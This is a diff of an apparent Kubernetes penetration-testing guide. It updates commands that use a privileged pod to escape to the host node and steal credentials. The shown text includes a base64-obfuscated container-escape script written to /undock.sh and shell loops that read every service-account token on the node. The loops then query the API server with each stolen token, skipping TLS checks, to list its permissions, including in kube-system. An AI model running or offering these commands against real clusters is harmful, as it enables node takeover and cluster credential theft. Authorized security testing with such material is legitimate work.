@@ -367,12 +367,10 @@ The file will be at /undock.sh and is needed to make the next examples work from
 kubectl exec -it priv-exec-pod -- bash -c "echo ZD1gZGlybmFtZSAkKGxzIC14IC9zKi9mcy9jKi8qL3IqIHxoZWFkIC1uMSlgCm1rZGlyIC1wICRkL3c7ZWNobyAxID4kZC93L25vdGlmeV9vbl9yZWxlYXNlCnQ9YHNlZCAtbiAncy8uKlxwZXJkaXI9XChbXixdKlwpLiovXDEvcCcgL2V0Yy9tdGFiYAp0b3VjaCAvbzsgZWNobyAkdC9jID4kZC9yZWxlYXNlX2FnZW50O2VjaG8gIiMhL2Jpbi9zaAokMSA+JHQvbyIgPi9jO2NobW9kICt4IC9jO3NoIC1jICJlY2hvIDAgPiRkL3cvY2dyb3VwLnByb2NzIjtzbGVlcCAxO2NhdCAvbwo= | base64 -d > /undock.sh" 
 ```
 
-
-
-
 **Run kubectl can-i --list against ALL tokens found on the node**
 
-*Run this where you have kubectl installed, and NOT from within the priv pod.* 
+*Run this where you have kubectl installed, and NOT from within the priv pod.*
+*Make sure you already dropped undock.sh to the pod* 
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
 for filename in $tokens; \
@@ -380,7 +378,10 @@ do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
 echo "Token Location: $filename_clean"; \
 tokena=`kubectl exec -it priv-exec-pod -- sh undock.sh "cat $filename_clean"`; \
 echo -n "What can I do? "; \
-kubectl --token=$tokena auth can-i --list; echo; echo; echo; \
+SERVER=`kubectl config view --minify --flatten -ojsonpath='{.clusters[].cluster.server}'`; \
+export KUBECONFIG="dummy"; \
+kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i --list; echo; echo; echo; \
+unset KUBECONFIG; \
 done
 ```
 This is what just happened:
@@ -396,6 +397,7 @@ The next command will do the same thing, but just in the kube-system namespace.
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
 
 *Run this where you have kubectl installed, and NOT from within the priv pod.*
+*Make sure you already dropped undock.sh to the pod* 
 ```
 tokens=`kubectl exec -it priv-exec-pod -- sh undock.sh """find /var/lib/kubelet/pods/ -name token -type l"""`; \
 for filename in $tokens; \
@@ -403,7 +405,10 @@ do filename_clean=`echo $filename | tr -dc '[[:print:]]'`; \
 echo "Token Location: $filename_clean"; \
 tokena=`kubectl exec -it priv-exec-pod -- sh undock.sh "cat $filename_clean"`; \
 echo -n "What can I do? "; \
-kubectl --token=$tokena auth can-i --list -n kube-system; echo; echo; echo; \
+SERVER=`kubectl config view --minify --flatten -ojsonpath='{.clusters[].cluster.server}'`; \
+export KUBECONFIG="dummy"; \
+kubectl --server=$SERVER --insecure-skip-tls-verify --token=$tokena auth can-i --list -n kube-system; echo; echo; echo; \
+unset KUBECONFIG; \
 done
 ```
 
